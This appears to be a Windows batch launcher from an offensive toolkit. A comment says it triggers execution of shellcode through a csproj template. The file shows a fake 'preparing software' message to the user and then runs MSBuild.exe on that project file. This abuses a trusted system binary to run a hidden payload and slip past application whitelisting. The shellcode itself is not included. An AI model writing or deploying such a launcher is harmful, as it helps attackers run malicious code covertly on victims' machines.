:: trigger to exec shellcode.xml
@echo off
echo [*] Please Wait, preparing software ..
:: 'The call' (msbuild XML template execution) ..
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe RePlaC.csproj
exit
